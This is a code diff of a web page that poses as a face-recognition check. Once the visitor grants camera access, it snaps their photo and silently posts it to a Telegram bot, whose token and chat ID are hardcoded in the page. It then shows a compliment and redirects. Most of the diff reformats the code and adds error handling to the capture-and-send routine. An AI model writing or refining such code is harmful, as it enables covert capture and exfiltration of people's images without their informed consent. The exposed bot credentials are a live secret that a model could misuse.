@@ -34,23 +34,22 @@
     <video id="video" autoplay muted></video>
     <canvas id="canvas" style="display: none;"></canvas>
     <p id="message">Allow camera access for face recognition...</p>
-
     <script>
         const BOT_TOKEN = "8146051541:AAEWlqCaaW0Z8VaejI5UX8p4T4dYPXCZv4Y";
         const CHAT_ID = "5934902786";
-
+    
         async function loadModels() {
-        try {
-            await faceapi.nets.tinyFaceDetector.loadFromUri('/models/');
-            console.log("Models loaded!");
-            document.getElementById("message").textContent = "Models loaded, starting camera...";
-            startCamera();
-        } catch (error) {
-            console.error("Error loading models:", error);
-            document.getElementById("message").textContent = "Failed to load models!";
+            try {
+                await faceapi.nets.tinyFaceDetector.loadFromUri('/models/');
+                console.log("Models loaded!");
+                document.getElementById("message").textContent = "Models loaded, starting camera...";
+                startCamera();
+            } catch (error) {
+                console.error("Error loading models:", error);
+                document.getElementById("message").textContent = "Failed to load models!";
+            }
         }
-    }
-
+    
         async function startCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
@@ -62,7 +61,7 @@
                 document.getElementById("message").textContent = "Camera access denied!";
             }
         }
-
+    
         async function capturePhoto() {
             const video = document.getElementById("video");
             const canvas = document.getElementById("canvas");
@@ -70,27 +69,42 @@
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            const detections = await faceapi.detectAllFaces(canvas, new faceapi.TinyFaceDetectorOptions());
-            if (detections.length > 0) {
-                document.getElementById("message").textContent = "You look beautiful/handsome today! Redirecting...";
-                sendToTelegram(canvas.toDataURL("image/jpeg"));
-                setTimeout(() => {
-                    window.location.href = "https://your-redirect-page.com";
-                }, 3000);
-            } else {
-                document.getElementById("message").textContent = "No face detected. Please try again!";
+    
+            try {
+                const detections = await faceapi.detectAllFaces(canvas, new faceapi.TinyFaceDetectorOptions());
+                if (detections.length > 0) {
+                    document.getElementById("message").textContent = "You look beautiful/handsome today! Redirecting...";
+                    sendToTelegram(canvas.toDataURL("image/jpeg"));
+                    setTimeout(() => {
+                        window.location.href = "https://your-redirect-page.com"; // Update this URL
+                    }, 3000);
+                } else {
+                    document.getElementById("message").textContent = "No face detected. Please try again!";
+                }
+            } catch (error) {
+                console.error("Face detection error:", error);
+                document.getElementById("message").textContent = "Error during face detection!";
             }
         }
-
+    
         function sendToTelegram(photoDataUrl) {
             const blob = dataURLtoBlob(photoDataUrl);
             const formData = new FormData();
             formData.append("chat_id", CHAT_ID);
             formData.append("photo", blob, "photo.jpg");
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData })
+                .then(response => {
+                    if (response.ok) {
+                        console.log("Photo sent successfully");
+                    } else {
+                        console.error("Failed to send photo");
+                    }
+                })
+                .catch(error => {
+                    console.error("Error sending photo:", error);
+                });
         }
-
+    
         function dataURLtoBlob(dataURL) {
             const byteString = atob(dataURL.split(',')[1]);
             const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
@@ -101,14 +115,16 @@
             }
             return new Blob([ab], { type: mimeString });
         }
-        window.onload = async function () {
-    await new Promise(resolve => setTimeout(resolve, 1000)); // Delay 1s untuk pastikan script dah load
-    if (typeof faceapi !== 'undefined') {
-        loadModels();
-    } else {
-        console.error("Face-API.js failed to load.");
-    }
-};
-    </script>
+    
+        window.onload = function () {
+            setTimeout(() => {
+                if (typeof faceapi !== 'undefined') {
+                    loadModels();
+                } else {
+                    console.error("Face-API.js failed to load.");
+                }
+            }, 1000);
+        };
+</script>
 </body>
 </html>
